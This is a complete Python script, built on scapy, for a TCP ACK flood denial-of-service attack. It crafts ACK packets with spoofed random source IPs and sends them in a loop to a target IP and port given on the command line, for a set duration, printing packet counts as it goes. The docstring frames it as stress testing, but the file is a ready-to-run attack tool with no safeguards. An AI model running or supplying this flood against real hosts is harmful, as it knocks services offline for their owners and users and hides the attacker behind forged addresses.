#!/usr/bin/env python3

"""
TCP-ACK Flood Attack Script
- Floods target with TCP ACK packets
- Used for network stress testing
- Compatible with Python 3.10
"""

from scapy.all import *
import argparse
import sys
import time
from datetime import datetime

def tcp_ack_flood(target_ip, target_port, duration=60):
    """
    Execute a TCP ACK flood attack against the target
    
    :param target_ip: Target IP address
    :param target_port: Target port number
    :param duration: Attack duration in seconds
    """
    print(f"[*] Starting TCP-ACK flood attack against {target_ip}:{target_port}")
    print(f"[*] Attack will run for {duration} seconds")
    print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    # Track start time
    start_time = time.time()
    packet_count = 0
    
    try:
        # Continue until duration is reached
        while time.time() - start_time < duration:
            # Create a random source IP (spoofing)
            source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            source_port = random.randint(1024, 65535)
            
            # Craft the TCP-ACK packet
            packet = IP(src=source_ip, dst=target_ip)/TCP(sport=source_port, dport=target_port, flags="A", seq=random.randint(1000,9000), ack=random.randint(1000,9000))
            
            # Send the packet
            send(packet, verbose=0)
            packet_count += 1
            
            # Print status every 100 packets
            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} packets | Elapsed time: {elapsed:.2f}s")
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    
    # Print final statistics
    total_time = time.time() - start_time
    print(f"\n[*] Attack completed")
    print(f"[*] Total packets sent: {packet_count}")
    print(f"[*] Total time: {total_time:.2f} seconds")
    print(f"[*] Packet rate: {packet_count/total_time:.2f} packets/second")

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='TCP-ACK Flood Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    
    args = parser.parse_args()
    
    # Execute attack
    tcp_ack_flood(args.target, args.port, args.duration)
